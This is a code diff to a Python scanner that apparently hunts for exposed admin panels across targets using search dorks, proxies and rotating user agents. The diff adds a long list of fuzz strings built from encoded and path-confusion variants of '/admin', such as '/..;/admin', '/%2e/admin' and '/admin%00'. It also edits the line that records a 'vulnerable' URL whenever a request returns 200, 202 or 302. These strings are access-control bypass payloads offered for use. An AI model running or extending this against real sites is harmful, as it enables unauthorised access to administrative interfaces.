@@ -10,7 +10,13 @@ from termcolor import colored
 
 dorks = [] # will be filled with dorks stored as tuples with the prefix first then the postfix being second in the pair dorks that dont have a post fix will have " " as the second pair 
 proxies = [] # will be filled with proxies 
-fuzz = [] # fuzz to be added
+fuzz = ["/admin/?","//admin//","///admin///","/./admin/./","/admin?","/admin??","/admin/?/","/admin/??","/admin/??/","/admin/..","/admin/../",
+        "/admin/./","/admin/.","/admin/.//","/admin/*","/admin//*","/admin/%2f","/admin/%2f/","/admin/%20","/admin/%20/","/admin/%09","/admin/%09/",
+        "/admin/%0a","/admin/%0a/","/admin/%0d","/admin/%0d/","/admin/%25","/admin/%25/","/admin/%23","/admin/%23","/admin/%26","/admin/%3f","/admin/%3f/",
+        "/admin/%26/","/admin/#","/admin/#/","/admin/#/./","/./admin","/./admin/","/..;/admin","/..;/admin/","/.;/admin","/.;/admin/","/;/admin",
+        "/;/admin/","//;//admin","//;//admin/","/admin/./","/%2e/admin","/%2e/admin/","/%20/admin/%20","/%20/admin/%20/","/admin/..;/","/admin.json",
+        "/admin/.json","/admin..;/","/admin;/","/admin%00","/admin.css","/admin.html","/admin?id=1","/admin~","/admin/~","/admin/°/","/admin/&",
+        "/admin/-","/admin\/\/",""] # fuzz to be added
 headers = [{}] #will be filled with user agents 
 tried = set()
 vulnerable = []
@@ -93,7 +99,7 @@ def Vulnsearch():
                                     reqcount += 1
                                     if np.status_code in [202,200,302]:
                                         with lock:
-                                            vulnerable.append("https://" + dorks[i][0] + target + dorks[i][1] + fuzz[k])
+                                            vulnerable.append("https://" + dorks[i][0] + target + fuzz[k])
                                         flagcatch(np,flagscaught)
                                 else:
                                     bypassatt = "https://" + dorks[i][0] + target + dorks[i][1] + fuzz[k]
